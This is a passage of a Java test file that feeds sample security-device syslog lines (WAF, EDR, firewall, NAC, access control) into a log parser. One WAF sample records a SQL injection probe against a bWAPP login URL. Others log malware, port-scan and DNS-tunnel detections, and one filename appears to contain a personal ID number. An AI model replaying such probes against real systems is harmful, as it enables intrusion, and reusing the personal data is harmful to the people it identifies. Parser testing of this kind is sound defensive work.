      data = "<100>Jan 15 15:17:47 2020 DPTECH %%WAF/WEBATTACK/4/SRVLOG(l): att_level1:webattack;``att_level2:Inject Attack;``att_level3:SQL Inject;``action:block;``severity:High Risk;``protocol:HTTP;``source-ip:10.101.1.100;``source-port:46844;``destination-ip:10.101.1.1;``destination-port:88;``url:/bWAPP/login.php?a=@@version;``method:GET ;``host:10.101.1.1:88;``description:[signature_id:311]The SQL injection vulnerability attack signature is detected in URL_parameter part.In the mysql database, you can use @@version to return the current version information. It may change the execution logic of database sentence when the user input contains the version keyword and is executed in the database, leading to the background database version is leaded.;``attack_context:@@version;``httpinfo:GET /bWAPP/login.php?a=@@version HTTP/1.1 Host: 10.101.1.1:88 Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: PHPSESSID=af64ko2eckqf93tr231i95sh2p;``username:;``session:;``";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testSangFor1000Syslog() {
    String parserFile = "./resources/parsers/acm_sangfor_ac1000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>May 19 02:49:07 WIN-FNAOU24F2MK BA[5444]: [log_type:flux] [record_time:2023-05-18 18:01:15] [user:10.65.237.30] [group:/] [host_ip:10.65.237.30] [dst_ip:::] [serv:访问网站] [app:新闻门户] [site:未定义位置] [tm_type:/移动终端/windows系统移动终端] [up_flux:1719] [down_flux:1629]";
      parse(botuEngine, data);
      data = "<134>May 19 02:57:01 WIN-FNAOU24F2MK BA[6104]: [log_type:url] [record_time:2023-05-18 19:03:20] [user:10.65.233.236] [group:/] [host_ip:10.65.233.236] [dst_ip:101.91.42.219] [serv:访问网站] [app:新闻门户] [site:未定义位置] [tm_type:/移动终端/windows系统移动终端] [net_action:记录] [url:tools.3g.qq.com] [DNS:m.qq.com] [title:-] [snapshot:-]";
      parse(botuEngine, data);
      data = "<134>May 19 03:09:23 WIN-FNAOU24F2MK BA[5444]: [log_type:other_log] [record_time:2023-05-19 02:49:07] [user:10.192.10.31] [group:/] [host_ip:10.192.10.31] [dst_ip:121.40.200.192] [serv:远程登录] [app:向日葵远控] [site:未定义位置] [tm_type:/PC/MAC PC] [net_action:拒绝] [url:slapi.oray.net] [DNS:slapi.oray.net] [filename:-] [filetype:-]";
      parse(botuEngine, data);
      data = "<134>May 19 08:28:09 WIN-FNAOU24F2MK BA[6104]: [log_type:login] [record_time:2023-05-19 08:14:04] [log_type:login] [usr_name:10.65.29.43] [grp_name:/] [hst_ip:10.65.29.43] [login_time:-] [online_time:-]";
      parse(botuEngine, data);
      data = "<134>May 19 02:11:05 WIN-FNAOU24F2MK BA[5444]: [log_type:upfile] [record_time:2023-05-18 05:43:37] [user:10.192.10.76] [group:/] [host_ip:10.192.10.76] [dst_ip:116.62.149.7] [serv:访问网站] [app:未识别应用] [site:未定义位置] [tm_type:/PC/MAC PC] [net_action:记录] [urltype:未识别应用] [filename:picture/attendance_318656_320124197206052045.jpg] [filesize:61220] [filetype:图片]";
      parse(botuEngine, data);
      data = "<134>May 19 09:53:38 WIN-H3550FDC7VG BA[3824]: [log_type:other_log] [record_time:2023-05-19 09:34:38] [user:10.132.184.123] [group:/] [host_ip:10.132.184.123] [dst_ip:124.237.224.8] [serv:网络存储] [app:百度网盘[下载]] [site:未定义位置] [tm_type:/PC/MAC PC] [net_action:记录] [url:bddx-ct00.baidupcs.com/file/b4a3f5745n3e6d07a82009e0cc7bf6f8?bkt=en-d3a65691252603d31269e0018b60a0050447b435bcea5abd5b7ba23d999aaa58ccffc3a47604ca1c&fid=1101800467212-250528-55400638795091&time=1684459423&sign=FDTAXUbGERLQlBHSKfWqi-DCb740ccc5511e5e8fedcff06b081203-k70Q/apb6zDJWPdWdI2AzXiwuz8=&to=206&size=7095132&sta_dx=7095132&sta_cs=5191&sta_ft=zip&sta_ct=6&sta_mt=6&fm2=MH,Baoding,Anywhere,,江苏,ct&ctime=1664423362&mtime=1664517105&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=7095132&vuk=1101800467212&iv=0&htype=&randtype=&tkbind_id=0&esl=1&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-a61131e1bfd2d817f1103ae846c54f52a3a5a2ac80397c4effbeacb22f6a5923910ac31f33305628&sl=78053454&expires=8h&rt=pr&r=336174318&vbdid=-&fin=CC-Library-Panel-3_8_299.zip&bflag=406,79,206,18-206&err_ver=1.0&check_blue=1&rtype=1&devuid=BDIMXV2-O_830AE57E691F43B997E6E35D2B388AF6-C_0-D_0025_3885_21B3_9A08.-M_88A4C2AE1821-V_C0D1144E&clienttype=9&channel=0&dp-logid=8974296457778405984&dp-callid=0.1&tsl=120&csl=120&fsl=-1&csign=hzxTfMQ9X4ERrhFVkXVMnmeP2SQ=&so=1&ut=6&uter=0&serv=0&uc=4092955663&ti=e292035734ac5995920d754bad0ed58dcf575a9bd72ff4e7305a5e1275657320&sta_eck=1&hflag=30&from_type=3&adg=c_083d396403513ba26ba47b464c41cd3c&reqlabel=250528_l_2b48939bdf748f784ebf44b8cc9ab62f_-1_b8f0264f687041574e930f8068947c43&ibp=1&by=themis] [DNS:bddx-ct00.pcs.baidu.com] [filename:CC-Library-Panel-3_8_299.zip] [filetype:压缩文件] ";
      parse(botuEngine, data);
      data = "<15>logs: d0:loaderreader.cpp:134 ^Imore data now 7770 9914 /aclog/log_data/aclog/20231211/F F 120 7770 71492";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testEdrDPtechXDRSyslog() {
    String parserFile = "./resources/parsers/edr_dptech_xdr_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "ProcessBasicInfo;;2;;1631605377;;192.168.67.149;;31624678c4b5bfcb437dcbf1d221fbc1a44bf9aa3683cf0967974730399bf399;;pid=0061405281000668;;parent_id=-;;pid_name=Hash.exe;;proc_path=C:\\Users\\Administrator\\Desktop\\Hash.exe;;cmd=\"C:\\Users\\Administrator\\Desktop\\Hash.exe\" ;;flag=0;;user=WIN\u0002LCKCK905PFM\\Administrator;;create_at=1631605377;;stop_at=-;;mac=000c29de3ef7;;machineName=WIN-LCKCK905PFM;;";
      parse(botuEngine, data);
      data = "AntiVirusReport;;5;;1636102981;;192.168.31.11;;3188aaf88d245b24e6f2dfca1dfbcebf5b1df4ee29ae08fbd569560601f9744d;;vftime=1636102981;;vtype=1;;vpath=C:/Documents and Settings/xj/\\xe6\\xa1\\x8c\\xe9\\x9d\\xa2/test/0ae6cbb4038cf76d21b1f70cb4c7bd57.dat;;vname=Trojan-Spy.MSIL.Stealer.e;;vfindby=10;;vresult=2;;nodename=WD-65556713C0;;mac=000c2966fb90;;";
      parse(botuEngine, data);
      data = "ActionRuleReport;;5;;1636103182;;192.168.31.30;;316854adc6fd7ba876d5a2e02263cd263e327cb784c81f7da699137df5a8be81;;action_rule_id=1f5bed82-3d44-11ec-92f5-0242ac110002;;action=5;;action_result=Success;;op_time=1636103183;; mac=000c29caf63b;;machineName=DESKTOP-UBV2BIR;;";
      parse(botuEngine, data);
      data = "DeviceActionsInfo;;2;;1636102386;;192.168.31.117;;2c2a6081f2d1e30375832e91cfc0b9092622eb99d0e261a5b45fd79d1451d912;;pid=;;pid_name=;;op=1;;name=VendorCo ProductCode USB Device;;op_time=1636102385;;mac=b42e9965f64b;;machineName=DW;;";
      parse(botuEngine, data);
      data = "FileActionsInfo;;2;;1636099472;;192.168.31.15;;31384f704f58e73558f396eed5e9765fdb63bee93526d61ea6495fe7a71c8d9a;;pid=006184e54d0003b4;;pid_name=SearchFilterHost.exe;;md5=52d56d1013d4f1b99102679314cc5325;;file_path=C:\\\\Windows\\\\System32\\\\SearchFilterHost.exe;;file_size=113664;;created_at=-;;updated_at=1247535577;;action=4;;result=0;;op_time=1636099469;;mac=000c2988a996;;machineName=D-PC;;";
      parse(botuEngine, data);
      data = "RegisterActionsInfo;;2;;1636100585;;192.168.31.15;;31384f704f58e73558f396eed5e9765fdb63bee93526d61ea6495fe7a71c8d9a;;pid=006184e865000b04;;pid_name=regedit.exe;;key=\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\test1;;name=test11;;value=0x0000000000000111;;prev_value=-;;action=3;;result=0;;op_time=1636100579;;mac=000c2988a996;;machineName=D-PC;;";
      parse(botuEngine, data);
      data = "NetworkActionsInfo;;2;;1636100874;;192.168.111.117;;2c2a6081f2d1e30375832e91cfc0b9092622eb99d0e261a5b45fd79d1451d912;;pid=006184d418001c34;;pid_name=chrome.exe;;src_ip=192.168.101.117;;src_port=59421;;dest_ip=172.217.160.74;;dest_port=443;;protocol=TCP;;url=-;;result=0;;op_time=1636100875;;mac=b42e9965f64b;;machineName=D-WD;;";
      parse(botuEngine, data);
      data = "DNSActionsInfo;;2;;1636101205;;192.168.111.117;;2c2a6081f2d1e30375832e91cfc0b9092622eb99d0e261a5b45fd79d1451d912;;pid=006184d418001c34;;pid_name=chrome.exe;;dns_query=pics7.baidu.com;;dns_resovle=182.140.225.35;;op_time=1636101205;;mac=b42e9965f64b;;machineName=D-WD;;";
      parse(botuEngine, data);
      data = "UserInfo;;5;;1636101451;;192.168.111.15;;31384f704f58e73558f396eed5e9765fdb63bee93526d61ea6495fe7a71c8d9a;;pid=;;pid_name=;;user_name=testuser1;;action_type=1;;op_time=1636101451;;account=xjwd;;mac=000c2988a996;;machineName=D-PC;;";
      parse(botuEngine, data);
      data = "PrintActionsInfo;;2;;1631606229;;192.168.67.149;;31624678c4b5bfcb437dcbf1d221fbc1a44bf9aa3683cf0967974730399bf399;;printer=Brother-DCP-116C;;pid=;;pid_name=;;user=Administrator;;document=123.txt;port=;;op_time=1631606225;;mac=000c29de3ef7;;machineName=WIN-LCKCK905PFM;;";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testJuniperFirewallSSG5Syslog() {
    String parserFile = "./resources/parsers/firewall_juniper_ssg5_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<132>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-warning-00515: Login attempt to system by admin enable via Telnet from 103.123.235.52:57329 has failed (2023-06-12 14:13:53)";
      parse(botuEngine, data);
      data = "<132>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-warning-00518: ADM: Local admin authentication failed for login name root: invalid login name (2023-06-12 14:31:26)";
      parse(botuEngine, data);
      data = "<134>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-information-00519: ADM: Local admin authentication successful for login name webray (2023-06-12 14:29:00)";
      parse(botuEngine, data);
      data = "<134>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-information-00527: IP address 192.168.1.34 is assigned to 000c2996f729. (2023-06-12 10:46:23)";
      parse(botuEngine, data);
      data = "<131>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-error-00528: SSH: Client at  attempted to connect with invalid version string. (2023-06-12 14:20:42)";
      parse(botuEngine, data);
      data = "<131>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-error-00528: SSH: Failed to negotiate encryption algorithm with host 175.207.226.153. (2023-06-12 12:16:33)";
      parse(botuEngine, data);
      data = "<132>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-warning-00528: SSH: Password authentication failed for admin user 'root' at host 141.98.11.110. (2023-06-12 14:05:00)";
      parse(botuEngine, data);
      data = "<172>ssg5-serial: NetScreen device_id=0162092007001077  [Root]system-warning-00019: Syslog cannot connect to the TCP server 218.4.238.84; the connection is closed. (2010-08-27 17:35:49)";
      parse(botuEngine, data);
      data = "<130>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-critical-00027: Admin root has been re-enabled by NetScreen system after being locked due to excessive failed login attempts (2023-06-12 14:26:52)";
      parse(botuEngine, data);
      data = "<033>ssg5-serial: NetScreen device_id=0162122006002849  [Root]system-alert-00027: Login attempt by admin root from 175.195.174.55 is refused as this account is locked (2023-06-12 13:05:02)";
      parse(botuEngine, data);
      data = "<173>ssg5-serial: NetScreen device_id=ssg5-serial  [Root]system-notification-00257(traffic): start_time=\"2010-08-27 17:42:27\" duration=61 policy_id=1 service=udp/port:17788 proto=17 src zone=Trust dst zone=Untrust action=Permit sent=123 rcvd=0 src=192.168.200.43 dst=113.31.30.142 src_port=12453 dst_port=17788 src-xlated ip=221.224.160.210 port=1739 dst-xlated ip=113.31.30.142 port=17788 session_id=7031 reason=Close - AGE OUT";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testNacVenusSyslog() {
    String parserFile = "./resources/parsers/nac_venus_nac-6000[v3.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Apr 14 04:56:16 Themis license: devid=58 date=\"2021-01-07 18:11:51\" dname=NAC logtype=1 pri=4 mod=webui dsp_msg=\"登录成功。\" from=\"172.16.1.51\" user=\"administrator\" powername=\"super\" act=\"\" time=1610014311 eventtype=600 eventid=605";
/*      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=0 date=\"2014/08/21 14:02:37\" dname=themis111 logtype=1 pri=5 mod=hostname act=修改 hostname=themis111 user=\"root\" dsp_msg=\"主机名称设置成功\" result= 0";
      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=0 date=\"2014/08/18 09:59:26\" dname=Themis logtype=1 pri=5 mod=snmp act=start result=0 dsp_msg=\" snmp启动成功\"";
      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=0 date=\"2012/02/29 16:55:19\" dname=themis logtype=1 pri=5 mod=ddns act=设置dsp_msg=\"设置ddns成功\" result=0";
      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=0 date=\"2016/02/29 16:52:27\" dname=Themis logtype=3 pri=5 mod=clock act=设置 newdate=2016/02/29 newtime=16:52:27 dsp_msg=\"设置时间\" result=0";
      parse(botuEngine, data);
      data = "2021-01-08T16:26:07.902823+08:00 NAC access[23473]: devid=58 date=\"2021/01/08 16:26:07\" dname=NAC logtype=7 pri=6 mod=access act=设置 result=成功 user=root dsp_msg=\"登录门户基本设置 成功\"";
      parse(botuEngine, data);
      data = "2021-01-09T14:27:22.342788+08:00 NAC security[6087]: devid=58 date=\"2021/01/09 14:27:22\" dname=NAC logtype=7 pri=6 mod=security act=添加 result=成功 user=administrator dsp_msg=\"添加Windows安全基线 [test] 成功\"";
      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=58 date=\"2021/01/08 10:12:52\" dname=NAC logtype=7 pri=2 mod=dhcp act=err_report result=failed dsp_msg= \"致命错误 内存不足\"";
      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=58 date=\"2021/01/08 15:05:33\" dname=NAC logtype=4 pri=4 mod=radius act=login eventtype=300 eventid=301 user=\"ytest\" auth_type=\"pwd auth\" mac=\"00:0C:29:5F:41:57\" dsp_msg=\"MAC地址[00:0C:29:5F:41:57] 802.1x认证失败: 用户名[ytest] 认证协议[EAP-MD5] 交换机IP[172.16.1.119] 交换机接口[FastEthernet0/11] 认证原因[802.1x认证用户密码错误].\"";
      parse(botuEngine, data);
      data = "Apr 14 04:56:16 Themis license: devid=58 date=\"2021/01/20 10:12:52\" dname=NAC logtype=4 pri=4 mod=AUTHCENTER act=login eventtype=300 eventid=301 user=\"a\" auth_type=\"pwd auth\" ip='' dsp_msg=\"用户 [00:11:AA:33:CC:DD] 登录失败: 超出了有效认证期\"";
      parse(botuEngine, data);*/
      data = "Apr 14 04:56:16 Themis license: devid=0 date=\"2014/08/18 09:59:33\" dname=Themis logtype=1 pri=5 mod=snmp act=trap result=0 admin=1 serial=659939000c309a48 dsp_msg=\"内存阀值：阀值=1%, 使用=63%\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAptDptechSyslog() {
    String parserFile = "./resources/parsers/apt_dptech_apt1000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "dname=\"192.168.0.11\" module=\"syslog\" severity=\"debug\" type=\"attack\" time=\"2022-02-16T08:09:15.552419+0800\" src_ip=\"1.1.1.1\" dst_ip=\"2.2.2.2\" src_port=\"0\" dst_port=\"0\" protocol=\"ICMP\" sid=\"31500340\" prio=\"1\" class=\"31500\" msg=\"icmp ping command request\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testFirewallLegendsecSyslog() {
    String parserFile = "./resources/parsers/firewall_legendsec_firewall[6.1.10.51765]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "devid=\"3\" dname=\"NSG\" serial=\"6ea854364a9c3f40d4f5fe0d8997bc9f4ef5daa4\" module=\"ad\" severity=\"emerg\" vsys=\"root-vsys\" type=\"threat\" session_id=\"0\" time=\"1594011600\" addr_src=\"36.32.3.214\" addr_dst=\"120.33.204.246\" nataddr_src=\"::\" nataddr_dst=\"::\" natport_src=\"0\" natport_dst=\"0\" proto=\"TCP\" hit_num=\"31\" focus_type=\"NO\" action=\"drop\" session_time=\"0\" sess_nth=\"0\" sess_dev_id=\"0\" port_src=\"58208\" port_dst=\"33358\" user_src=\"\" user_dst=\"\" locale_src=\"安徽省合肥市\" locale_dst=\"福建省莆田市\" interface_src=\"\" interface_dst=\"\" zone_src=\"untrust\" zone_dst=\"\" appname=\"unidentified\" rule=\"__fast_disposal__\" profile=\"\" non_standard_port=\"NO\" app_category=\"CATEGORY-NONE\" app_risk=\"5\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" duration=\"0\" attacker_ip=\"36.32.3.214\" victim_ip=\"120.33.204.246\" attack_name=\"\" victim_name=\"\" sample_name=\"\" threat_name=\"Portscan\" threat_type=\"Attack_Defend\" threat_id=\"80011\" ioc_id=\"\" disposal_id=\"\" filename=\"\" filepath=\"\"";
      parse(botuEngine, data);
      data = "<13>klogd: devid=1 date=\"2023/04/07 11:08:22\" dname=themis logtype=1 pri=5 ver=0.3.0 rule_name=pf21 mod=pf smac=64:57:E5:0D:B7:74 dmac=00:14:1C:0C:F2:8D svm= dvm= sa=172.20.4.4 sport=42355 type=NULL da=8.8.8.8 dport=53 code=NULL proto=IPPROTO_UDP policy=允许 duration=0 rcvd=104 sent=104 fwlog=0 dsp_msg=\"包过滤日志\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testAcmAnzhou6000Syslog() {
    String parserFile = "./resources/parsers/acm_anzhou-tech_az6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<6>Mar 28 11:27:15 HOST;190000500115102280731041;ipv4;3; operate: operator_name=admin;operate_ip=192.168.7.153;create_time=2022-03-28 11:27:15;level=notice;reason=删除;result=成功;managestyle=WEB;content=删除 控制策略 id:2 配置";
      parse(botuEngine, data);
      data = "<4>Nov 29 14:09:52 HOST;110103300117111310721344;ipv4;3; system_state: 健康检查 tcp 探测成功";
      parse(botuEngine, data);
      data = "<5>Mar 28 10:41:03 HOST;190000500115102280731041;ipv4;3; ips: user_id=2;user_name=192.168.1.171;policy_id=1;src_mac=08:9e:01:6b:9e:43;dst_mac=00:21:45:c7:00:c1;src_ip=192.168.1.171;dst_ip=192.168.88.1;src_port=37990;dst_port=80;X-Forwarded-For=;app_name=..(HTTP);protocol=TCP;app_protocol=HTTP;event_id=957736;event_name=log4j2..;event_type=..;agg_mode:0;agg_count:0;attack_success:0;level=notice;ctime=2021-02-22 15:48:38;action=drop";
      parse(botuEngine, data);
      data = "<4>Apr 11 12:20:36 HOST;190003400120121260703881;ipv4;3; av: virus_name=avvirus005;file_name=病毒测试样本谨慎操作.zip;user_name=192.168.1.11;user_id=0;policy_id=1;src_mac=3c:2c:30:f9:7b:f8;dst_mac=00:e0:99:00:0a:4d;src_ip=192.168.1.11;dst_ip=192.168.1.12;src_port=64792;dst_port=80;app_name=HTTP文件下载;app_name_en=HTTP_FILE_DOWNLOAD;protocol=TCP;app_protocol=HTTP;level=warning;ctime=2022-04-11 12:20:36;action=block";
      parse(botuEngine, data);
      data = "<4>Apr 11 16:52:36 HOST;190003400120121260703881;ipv4;3; security_ipmac: user_name= ;src_ip=192.168.1.12;src_port=53623;dst_ip=239.255.255.250;dst_port=1900;name=ip-mac-bind;type=arp-attack;protocol=UDP;mac=3c:2c:30:f9:7b:f8;count=2;level=4;in_if_name=ge0;create_time=1649695945;end_time=1649695946;extend=;";
      parse(botuEngine, data);
      data = "<4>Apr 11 18:13:47 HOST;530000700117082161640276;ipv4;3; security_scan: user_name= ;src_ip=192.168.1.66;src_port=36050;dst_ip=192.168.212.66;dst_port=16000;name=port-scan;type=scan-attack;protocol=TCP;mac=90:2e:16:ab:26:76;count=1980;level=4;in_if_name=mgt0;create_time=1649700821;end_time=1649700825;extend=;";
      parse(botuEngine, data);
      data = "<4>Apr 11 15:19:30 HOST;190003400120121260703881;ipv4;3; security_flood: user_name= ;src_ip=192.168.10.1;src_port=0;dst_ip=192.168.10.118;dst_port=0;name=arp-flood;type=arp-attack;protocol=ARP;mac=68:91:d0:d5:64:e6;count=41;level=4;in_if_name=ge13;create_time=1649690359;end_time=1649690368;extend=;";
      parse(botuEngine, data);
      data = "<4>Mar 28 14:54:04 HOST;190000500115102280731041;ipv4;3; security_abnormal_pkt: user_name= ;src_ip=10.23.88.75;src_port=0;dst_ip=123.123.123.0;dst_port=0;name=ip-option;type=abnormal-packet;protocol=ICMP;mac=c8:3a:35:d3:d9:bc;count=3;level=4;in_if_name=ge2;create_time=1648479243;end_time=1648479243;extend=;";
      parse(botuEngine, data);
      data = "<6>Mar 28 16:26:11 HOST;190004200120092825006629;ipv4;3; waf_advdefend: policy_name=test;url=\"http://istock.jrj.com.cn/article,000725,1891461.html\";waf_method=GET;src_mac=00:5b:51:31:c6:b1;dst_mac=ff:ff:ff:ff:ff:ff;src_ip=192.16.8.1;dst_ip=59.151.53.100;src_port=1510;dst_port=80;defend_type=\"防盗链\";level=notice;action=允许;msg=\"来源页面: http://stock.jrj.com.cn/share,000725.shtml\"";
      parse(botuEngine, data);
      data = "<6>Mar 28 16:36:17 HOST;190004200120092825006629;ipv4;3; waf_advdefend: policy_name=test;url=\"http://122.141.227.136/youku/6561A478953381CD9043845DD/030002060351AD67B9E18309275726E945B50C-D38D-DF84-02E5-A7B689E9289A.flv\";waf_method=GET;src_mac=-;dst_mac=-;src_ip=222.199.231.162;dst_ip=122.141.227.136;src_port=18931;dst_port=80;defend_type=\"应用隐藏\";level=warning;action=允许;msg=\"server字段被隐藏\"";
      parse(botuEngine, data);
      data = "<3>Mar 28 16:30:53 HOST;190004200120092825006629;ipv4;3; wpd: src=172.16.0.100;dst=172.16.0.102;service=ftp;login=camftp;pwd_type=null-pwd";
      parse(botuEngine, data);
      data = "<4>Apr 11 14:58:50 HOST;190003400120121260703881;ipv4;3; bfd: occur_time=2022-04-11 14:58:50;src=192.168.1.11;dst=192.168.1.12;service=ftp;crack_success:0;crack_account:;action=ignore";
      parse(botuEngine, data);
      data = "<1>Mar 28 16:02:41 HOST;000005200121070850355977;ipv4;3; servconn_policy: time=2022-03-28 16:02:41;policy_name=0;server_addr=192.168.7.153;out_addr=10.0.223.9;proto=TCP;port=443;action=1";
      parse(botuEngine, data);
      data = "<4>Apr 11 16:26:18 ABT;190003400120121260703881;ipv4;3; behavior_model: src_ip=192.168.2.20;dst_ip=192.168.201.5;src_port=61234;dst_port=53;src_mac=d4:81:d7:ca:58:f9;dst_mac=60:0b:03:ad:26:30;protocol=UDP;behavior_name_cn=DNS 隧道;behavior_name_en=DNS tunnel;behavior_detail=dnscat.3cba012b6284d273a814100a25f6fb7b14;behavior_desc=The DNS traffic is too large and there are abnormal dns packet.;level=warning;action=拒绝;";
      parse(botuEngine, data);
      data = "<6>Jul 12 15:14:47 D12;530000000119051342010751;ipv4;3; ti: ti_key=\"1.1.182.89\";ti_threat=垃圾邮件;src_ip=1.1.182.89;dst_ip=1.2.91.45;src_port=19308;dst_port=80;protocol=TCP";
      parse(botuEngine, data);
      data = "<6>Nov 29 14:09:52 HOST;530003300117111310721344;ipv4;3;statistic_traffic: user_name=test;ugname=root;umac=60:0B:03:AD:12:14;uip=192.168.8.82;appname=UDP;appgname=网络协议;up=720;down=0;create_time=1511859600;end_time=1511859660";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:45:18 HOST;530003300117111310721344;ipv4;3; policy_detail: src_ip=192.168.10.209;dst_ip=106.120.168.93;protocol=TCP;src_port=60051;dst_port=80;in_interface=ge10;out_interface=ge17;policyid=11;action= permit;Content=";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:55:48 HOST;530003300117111310721344;ipv4;3; web_access: user_name=192.168.4.223;user_group_name=root;term_platform=windows;term_device=PC;src_ip=192.168.4.223;dst_ip=125.88.193.243;url_domain=www.haosou.com;url=http://www.haosou.com/brw?w=1&v=7.1.1.558&u=http%3A%2F%2Fchurch-group-discounts.com%2F;url_cate_name=其他;handle_action=0;msg=";
      parse(botuEngine, data);
      data = "<0>Aug 06 10:56:50 HOST;110100000115060297071585;ipv4;3; malware_app: user_name=192.168.1.171;user_group_name=anonymous;term_platform=PC(Windows);term_device=PC;src_ip=192.168.1.171;dst_ip=103.72.47.244;web_name=www.youdao.com;url=http://www.youdao.com/; msg=";
      parse(botuEngine, data);
      data = "<6>Nov 28 16:45:28 HOST;530003300117111310721344;ipv4;3; im: user_name=test;user_group_name=root;term_platform=;term_device=PC;pid=1;src_mac=68:91:d0:d0:0b:79;src_ip=192.168.1.69;dst_ip=223.167.104.149;dst_port=8080;app_name=微信;app_cat_name= 即时通讯;handle_action=0;account=2743413360;action_name=收消息;content=;msg=";
      parse(botuEngine, data);
      data = "<5>Nov 28 17:00:29 HOST;530003300117111310721344;ipv4;3; social_log:user_name=192.168.4.223;user_group_name=root;term_platform=windows;term_device=PC;pid=1;src_mac=28:d2:44:37:6c:f0;src_ip=192.168.4.223;dst_ip=116.10.186.184;dst_port=80;app_name=猫扑论坛;app_cat_name=网络社区;handle_action=0;account=sradish_xiaoxiao;action_name=发表;subject=灌水;content=测试发帖灌水;msg=";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testLegendsecPowerV6000Syslog() {
    String parserFile = "./resources/parsers/firewall_legendsec_power-v6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<13>klogd: devid=1 date=\"2023/04/07 11:08:22\" dname=themis logtype=1 pri=5 ver=0.3.0 rule_name=pf21 mod=pf smac=64:57:E5:0D:B7:74 dmac=00:14:1C:0C:F2:8D svm= dvm= sa=172.20.4.4 sport=42355 type=NULL da=8.8.8.8 dport=53 code=NULL proto=IPPROTO_UDP policy=允许 duration=0 rcvd=104 sent=104 fwlog=0 dsp_msg=\"包过滤日志\"";
/*      parse(botuEngine, data);
      data = "Aug  7 19:06:16 Themis http-proxy: devid=0 date=\"2012/08/07 19:06:16\" dname=Themis logtype=2 pri=5 ver=0.3.0 mod=http_proxy act=connect result=0 sa=10.1.5.200 sport=4706 da=119.188.64.104 dport=80 url=\"GET http://119.188.64.104/instcomp.htm?soft=3600&status=0&m=734a18c2143cd2c315292ae79804e166&tick=5547343 HTTP/1.1\" sent=281 rcvd=208 duration=1 dsp_msg=\"ok\"  fwlog=0";
      parse(botuEngine, data);
      data = "Feb 16 15:01:03 Themis puma_block: devid=0 date=\"2012/02/16 15:01:03\" dname=Themis logtype=3 pri=5 ver=0.3.0 mod=puma_block act=ignore result = 0 user=administrator dsp_msg=\"ignore block ip=xx\" fwlog=0";
      parse(botuEngine, data);
